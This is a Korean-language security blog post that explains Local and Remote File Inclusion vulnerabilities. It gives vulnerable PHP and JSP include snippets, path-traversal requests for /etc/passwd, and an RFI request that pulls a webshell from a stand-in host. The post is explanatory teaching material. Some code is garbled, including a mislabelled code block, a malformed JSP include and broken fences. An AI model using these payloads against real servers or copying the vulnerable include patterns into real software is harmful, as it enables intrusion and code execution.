---
layout: single
title: File Inclusion (LFI/RFI)
categories: Web-vuln
tag: [File Inclusion, LFI,RFI, web, web vulnerability, injection]
toc: true
author_profile: false
---

# File Inclusion 취약점이란?

> 해당 취약점은 응용 프로그램에서 File을 불러 올 때 include를 사용하여 코드내에 Built 하거나 동적으로 파일을 포함하는 로직이 구현되어있을경우 일반적으로 나타나며, 다른 Path Traversal 과 같은 타 취약저믈과 연계될 수 있다.

💡 **<u>이러한 File Inclusion은 Local File Inclusion(LFI)와 Remote File Inclusion(RFI)로 나뉜다.</u>** 
{: .notice--primary} 

```javascript
$file = $_GET['file'];

include('testdircetory/' . $file);
```

위와같은 코드는 File Inclusion에 취약한 코드라고 볼 수 있다. 위와 같이 구현되어 있을 경우<br>
아래와 같은 취약점으로 이어질 수 있다.

```
http://test.com/?file=../../../etc/passwd
```

# Local File Inclusion
로컬에 존재하는 파일, 현재 서버에 존재하고 있는 파일을 실행할 수 있으며, 웹 서버의 엑세스 로그, 패스워드파일 등 민감한 파일을 열거 할 수 있으며, 해당 서버에 공격자가 File Upload 취약점을 통해 웹 쉘을 올려놓았어도 이를 Include 시킬 수 있다.

```
GET /testlfi?path=file:///etc/passwd
```

# Remote File Inclusion
원격지에서 파일을 읽어들여 이를 inclusion 하는 취약점이며, 공격자가 본인의 서버에 웹쉘을 미리 생성하여 이를 Inclusion 할 수 있다.<br>
http, ftp uri형식으로 보통 가져온다.

```
GET /testrfi?lib=https://eval.com/webshell.php
```

# 공격 표면
file을 읽은 후 이를 가져올 수 있는 구간이면 해당 취약점을 의심해볼 수 있다. 절대경로 또는 상대경로를 통해 요청을 하였을 시 요청 경로가 삭제되지 않는다면 LFI는 발생한다.

## 언어별 취약 코드 로직

<div class="notice--primary" markdown="1">

1. PHP

```php
<?php
if (isset($_GET['file'])) {
    include($_GET['file'] . '.php');
}
?>
```

2. JSP

```jsp
<%
   String p = request.getParameter("p");
   @include file="<%="includes/" + p +".jsp"%>"
%>
```

```
GET /testlfi?path=file:///etc/passwd
'''
or
'''
GET /testlfi?path=file=../../../../etc/passwd
```
</div>